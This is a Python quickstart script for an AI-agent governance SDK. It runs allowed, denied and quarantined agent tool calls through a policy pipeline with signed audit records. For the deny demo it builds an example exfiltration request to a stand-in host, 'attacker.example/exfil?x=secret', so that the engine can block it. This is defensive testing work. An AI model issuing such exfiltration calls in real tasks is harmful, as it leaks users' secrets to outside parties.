"""SDK-05 zero-infra quickstart: the full governed loop on SQLite + in-process opa-wasm, no Docker /
Postgres / OPA server. Loads a COMMITTED demo policy.wasm (built once at authoring time); all other
policy metadata is derived in-process from the demo constitution via the pure-Python compiler.

It is also the reference WIRING: allow, deny, and — via the `QuarantineSandbox` seam (RUN-03) —
a contained `sandbox` outcome. An unwired sandbox seam fails closed as a hard block, so it belongs
in the minimum wiring an integrator copies."""
from __future__ import annotations

import asyncio
from dataclasses import dataclass
from importlib.resources import files
from pathlib import Path
from tempfile import mkdtemp

from sqlalchemy import create_engine, func, select

from agentos_constitution import compile_constitution, load_constitution
from agentos_contract import ActionType, AgentAction, Outcome
from agentos_controlplane.audit import AuditWriter
from agentos_controlplane.auth import resolve_api_token
from agentos_controlplane.registry import Registry
from agentos_controlplane.sandbox import QuarantineSandbox
from agentos_controlplane.store.engine import create_all, create_session_factory
from agentos_controlplane.store.models import AuditRecord, SandboxRun
from agentos_pipeline.identity import IdentityStage
from agentos_pipeline.policy import ConstitutionPolicyEngine
from agentos_pipeline.posture import PostureMap
from agentos_pipeline.risk import PromptInjectionScorer
from agentos_pipeline.runner import Pipeline
from agentos_sdk.enforce import GovernanceQuarantined, governed_call

_PKG = files("agentos_sdk.quickstart")
DEMO_AGENT = "quickstart-agent"
# TRST-02 hardening: at trust <= 0.2 the SAME benign action grades allow -> sandbox,
# which is how the demo reaches a `sandbox` outcome without weakening the thresholds.
LOW_TRUST_AGENT = "quickstart-low-trust-agent"


@dataclass
class QuickstartResult:
    allow_outcome: Outcome
    deny_outcome: Outcome
    sandbox_outcome: Outcome
    sandbox_runs: int
    audit_records: int
    api_token: str
    db_path: str


def _build_engine() -> tuple[ConstitutionPolicyEngine, str]:
    """In-process engine from the COMMITTED policy.wasm + pure-Python compiled metadata. No OPA CLI."""
    constitution = load_constitution(str(_PKG / "demo_constitution.yaml"))
    bundle = compile_constitution(constitution)
    principles_meta = {
        p.id: {"title": p.title, "statement": p.statement, "effect": p.effect,
               "side_effects": [s.value for s in p.side_effects], "remediation": p.remediation}
        for p in constitution.principles
    }
    engine = ConstitutionPolicyEngine(
        wasm_path=str(_PKG / "policy.wasm"),
        lists=bundle.lists,
        constitution_version=bundle.constitution_version,
        principles_meta=principles_meta,
    )
    # An allowlisted host for the ALLOW demo (first entry of the egress allowlist).
    allow_host = next(iter(next(iter(bundle.lists.values()), ["example.com"])), "example.com")
    return engine, allow_host


def run(db_path: str | None = None) -> QuickstartResult:
    db_path = db_path or str(Path(mkdtemp(prefix="agentos_quickstart_")) / "quickstart.db")
    engine_db = create_engine(f"sqlite+pysqlite:///{db_path}")
    create_all(engine_db)
    sf = create_session_factory(engine_db)
    registry = Registry(sf)
    token = registry.register(DEMO_AGENT)
    low_trust_token = registry.register(LOW_TRUST_AGENT, trust_score=0.1)
    policy_engine, allow_host = _build_engine()
    audit = AuditWriter(sf, signer=registry.identity)  # ONE writer per store (chain head)
    pipeline = Pipeline(
        identity=IdentityStage(registry.identity),
        policy=policy_engine,
        scorers=[PromptInjectionScorer()],
        audit=audit,
        posture=PostureMap(),
    )
    # RUN-03: `sandbox` is where every MID-RISK action lands, and it is enforced through
    # this seam. Wire it or the outcome fails CLOSED as a hard block with no approval path
    # and no containment record — so this line is part of the minimum wiring, not an extra.
    sandbox = QuarantineSandbox(sf, audit)

    def act(url: str, agent_id: str = DEMO_AGENT, identity_token: str = token) -> AgentAction:
        return AgentAction(agent_id=agent_id, type=ActionType.tool_call, target="http_get",
                           payload={"url": url, "content": ""}, identity_token=identity_token)

    allow = asyncio.run(pipeline.evaluate(act(f"https://{allow_host}/data")))
    deny = asyncio.run(pipeline.evaluate(act("https://attacker.example/exfil?x=secret")))

    async def _real_side_effect():  # pragma: no cover - the sandbox path never awaits it
        raise AssertionError("a sandbox outcome must NOT run the governed operation")

    try:
        asyncio.run(
            governed_call(
                pipeline,
                act(f"https://{allow_host}/data", LOW_TRUST_AGENT, low_trust_token),
                _real_side_effect,
                sandbox=sandbox,
            )
        )
    except GovernanceQuarantined as quarantined:
        sandbox_outcome = quarantined.decision.outcome
    else:  # pragma: no cover - graded to sandbox by construction (trust 0.1, TRST-02)
        raise AssertionError("the low-trust demo action was expected to be quarantined")

    with sf() as s:
        n = s.scalar(select(func.count()).select_from(AuditRecord))
        runs = s.scalar(select(func.count()).select_from(SandboxRun))

    api_token = resolve_api_token(None)
    return QuickstartResult(
        allow.outcome, deny.outcome, sandbox_outcome, runs, n, api_token, db_path
    )


def main() -> None:
    r = run()
    print("agentos-guard quickstart — full governed loop on SQLite + in-process opa-wasm\n")
    print(f"  allowed action  -> {r.allow_outcome.value}")
    print(f"  exfil action    -> {r.deny_outcome.value}")
    print(f"  low-trust action-> {r.sandbox_outcome.value} — quarantined, the tool never ran "
          f"({r.sandbox_runs} sandbox_run row)")
    print(f"  audit records   -> {r.audit_records} (hash-chained, signed)")
    print(f"  sqlite db       -> {r.db_path}")
    print(f"\n  dev API token (for the control-plane API / dashboard): {r.api_token}")
    print("  start the API:   uvicorn-style create_app(...) — see the dashboard slice (5f)")
